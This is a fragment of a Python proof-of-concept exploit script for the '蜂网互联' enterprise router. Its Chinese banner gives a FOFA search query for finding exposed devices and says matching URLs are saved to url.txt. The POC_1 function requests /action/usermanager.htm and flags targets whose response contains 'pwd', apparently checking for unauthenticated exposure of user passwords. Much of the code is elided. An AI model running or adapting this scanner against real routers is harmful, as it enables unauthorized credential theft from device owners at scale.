...
def title():
    ...
    print('+  \033[31mVersion: 蜂网互联                                                   \033[0m')
    print('+  \033[31m使用格式:  python3 exp.py                                            \033[0m')
    print('+  \033[31mVersion: fofa：app="蜂网互联-互联企业级路由器"                                     \033[0m')
    print('+  \033[31m保存连接到url.txt                                                     \033[0m')
    print('+------------------------------------------')


def POC_1(target_url):
    url = target_url + "/action/usermanager.htm"
    headers = {
    ...
    try:
        ...
        if "pwd" in r.text and r.status_code == 200:
